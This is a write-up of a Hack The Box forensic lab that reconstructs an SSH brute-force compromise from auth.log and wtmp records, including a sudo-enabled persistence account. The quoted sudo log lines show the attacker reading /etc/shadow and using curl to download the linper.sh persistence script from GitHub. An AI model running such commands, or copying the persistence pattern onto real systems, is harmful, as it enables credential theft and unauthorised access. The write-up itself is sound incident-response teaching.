HTB Sherlock: Brutus

A Linux authentication investigation using auth.log and wtmp. I reconstructed an SSH brute-force attack, confirmed the compromised root account, identified the real interactive session, tracked local account persistence and extracted the final sudo command used after compromise.

Investigation goal: identify the brute-force source IP, confirm the compromised account, determine when the attacker established a terminal session, track the persistence account and extract the final privileged command.

Scenario Overview

The scenario describes a Confluence server that was attacked through SSH. The important part is that the evidence does not stop at failed passwords. The same auth.log also contains successful authentication, PAM sessions, local account creation, sudo group modification and privileged command execution. The wtmp artifact then gives a separate view of real terminal sessions.

What I thought first: if this is an SSH brute-force case, I should not only count failed logins. I need to connect failed attempts, accepted logins, session creation and post-login actions. Otherwise I might find noise but miss the actual compromise chain.

Artifacts and First Look

After extracting the challenge archive, I had three useful files: auth.log, wtmp and utmp.py. I started with auth.log because it is plain text and usually gives the fastest view of SSH activity.

The beginning of the log contained many CRON/PAM entries for the confluence user. I treated those as background noise until they connected to SSH activity. For this lab, the useful pivots were sshd, Failed password, Accepted password, useradd, groupadd, usermod and sudo.

Methodology

I used this workflow:

  1. Inspect the raw log format before extracting fields.
  2. Find successful SSH logins using grep "Accepted".
  3. Find failed password attempts and separate valid users from invalid user attempts.
  4. Correlate failed attempts with successful logins by source IP and timestamp.
  5. Use wtmp to confirm the real terminal session time.
  6. Search for suspicious users to identify persistence.
  7. Search sudo logs for post-compromise command execution.
Why this order: accepted logins tell me which accounts actually got in. Failed logins tell me whether the access was likely brute-forced. wtmp tells me when the interactive terminal session was established. Account-management logs show persistence. Sudo logs show what the attacker did with privileges.

Successful SSH Logins

The first useful pivot was filtering accepted SSH logins. The output showed two source IPs, but 65.2.161.68 stood out because it logged in as root multiple times and later as cyberjunkie.

$ cat auth.log | grep "Accepted" Mar 6 06:19:54 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2 Mar 6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2 Mar 6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2 Mar 6 06:37:34 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

I did not mark 65.2.161.68 as the attacker only because it had accepted logins. The stronger reason came from correlation: the same IP also produced failed login attempts shortly before the successful root authentication, then appeared again after a new local account was created.

Brute-force Evidence

Next I searched failed password events. The raw output contained both real local accounts and invalid user attempts. Invalid-user attempts are still suspicious, but for the task I needed to understand which valid accounts were attacked.

After excluding invalid user lines, the remaining valid-user failures targeted only backup and root.

$ grep -i "failed password" auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr 9 backup 6 root
What I concluded: failed attempts against root happened around the same window as an accepted root login from 65.2.161.68. That is the key link between brute-force behavior and account compromise.

Source IP Enrichment

I enriched 65.2.161.68 with ipinfo.io. It resolved to AWS EC2 in the ap-south-1 region. I would not treat that as attribution to the operator. It only tells me the source host was cloud infrastructure.

Analyst note: I would report this as “source IP hosted on AWS EC2” rather than “attacker is from India,” because cloud region geolocation is not the same as operator attribution.

Confirming the Manual Session with wtmp

The task asks for the time when the attacker logged in manually and established a terminal session. That timestamp is different from simply seeing Accepted password in auth.log. For this, I parsed the binary wtmp file with utmpdump.

The key wtmp record showed root on pts/1 from 65.2.161.68 at 2024-03-06 06:32:45. A later DEAD_PROCESS record showed the root session ended at 06:37:24. Only seconds later, cyberjunkie logged in from the same IP.

Why wtmp mattered: auth.log tells me authentication succeeded. wtmp tells me an actual login session existed on a terminal like pts/1. That makes the answer stronger.

Persistence Through a New Local Account

I searched for cyberjunkie across auth.log to understand whether it was an existing account or created during the incident. The log showed the full account creation sequence: group creation, user creation, password change and sudo group membership.

This is local-account persistence. The attacker used the compromised root account to create cyberjunkie, assign it a password, give it /bin/bash as a shell, add it to sudo, and then log in through SSH using that account. The MITRE ATT&CK mapping is T1136.001 - Create Account: Local Account.

Sudo Command Evidence

The root session and the new account were not the end of the story. Sudo logs showed that cyberjunkie executed privileged commands from /home/cyberjunkie on pts/1.

Mar 6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow Mar 6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The first command attempted to read /etc/shadow, which is strong credential-access evidence. The second command retrieved a script from GitHub raw content. The full command required by the task was:

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Lessons Learned

This lab is useful for SOC fundamentals because it shows how much can be reconstructed from Linux authentication artifacts. One auth.log file can reveal failed SSH attempts, successful authentication, PAM sessions, account creation, group membership changes and sudo commands. wtmp then gives a second source of truth for real interactive sessions.

auth.logwtmpSSH brute forceLinux persistencesudo evidence
  • Do not stop at failed-login counts. Always correlate with successful authentication.
  • Separate invalid user attempts from valid-user attempts when the question asks about real compromised accounts.
  • Use wtmp to confirm terminal sessions instead of relying only on SSH authentication lines.
  • Local user creation plus sudo group membership is strong persistence evidence.
  • Sudo logs can expose attacker intent after login, including credential access and script retrieval.
Final conclusion: the attacker brute-forced SSH from 65.2.161.68, compromised root, established a manual session at 2024-03-06 06:32:45, created a privileged local account named cyberjunkie for persistence, and used that account to execute privileged commands.
